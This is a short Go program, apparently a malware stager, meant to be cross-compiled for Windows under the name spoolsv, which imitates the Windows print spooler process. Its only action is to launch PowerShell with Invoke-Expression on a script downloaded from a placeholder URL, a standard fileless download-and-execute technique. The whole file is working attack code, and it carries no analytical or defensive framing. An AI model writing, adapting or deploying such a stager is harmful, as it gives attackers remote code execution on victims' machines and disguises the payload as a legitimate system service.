package main
import(
	"fmt"
	"os/exec"
)
//Compile with: env GOOS=windows GOARCH=386 go build spoolsv.go
func main(){
	c := exec.Command("powershell", "iex", "(New-Object Net.WebClient).DownloadString('<URL>')")
 
if err := c.Run(); err != nil {
	fmt.Println("Error: ", err)
	}
}       

